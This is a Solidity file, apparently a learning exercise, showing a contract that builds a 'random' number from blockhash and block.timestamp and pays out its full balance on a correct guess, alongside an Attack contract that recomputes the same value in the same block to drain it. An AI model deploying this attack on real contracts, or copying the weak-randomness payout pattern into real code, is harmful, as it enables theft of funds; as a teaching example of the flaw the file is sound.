//SPDX-License-Identifier:MIT
pragma solidity ^0.8.7;

//here guessing a random number
//1.block.timestamp is the current block time
//2.block.number is the current block number 
//3.abi.encodePacked() which takes data as inputs and returns bytes
//4.keccak256() is which takes bytes as input and returns hash 

//can do it in 2 ways 
//1.by using call -- failed,but why failed by low level call opcode
//2. by using ABI --  succeded 
contract GuessRandomNumber{

    function guessNumber(uint guess)public{
        uint surrogate = uint(keccak256(                //in our perspective it will definetly genrate a random number
            abi.encodePacked(                           //by calling using another contract it is acctually not
                blockhash(block.number-1),block.timestamp
            )
        ));

        if(guess==surrogate){
            (bool success,)=payable(msg.sender).call{value:address(this).balance}("");
            require(success,"transaction failed");
        }
    }

    fallback()external payable{

    }

    function getContractBalance()external view returns(uint ){
        return address(this).balance;
    }
}


//attack contract
//which states the we can not generate a random number using the contract properties

contract Attack{
    GuessRandomNumber public gu;
    
    constructor(GuessRandomNumber _gu){
        gu=_gu;
    }

//same logic here because the attackguess() and the guessNumber() will be packed in the same block in the blockchain
    function attackGuess()external{
        uint guess=uint(keccak256(
            abi.encodePacked(blockhash(block.number-1),block.timestamp)
        ));
        gu.guessNumber(guess);
    }

    fallback()external payable{

    }

    receive()external payable{

    }

    function contractBalance()external view returns(uint ){
        return address(this).balance;
    }
}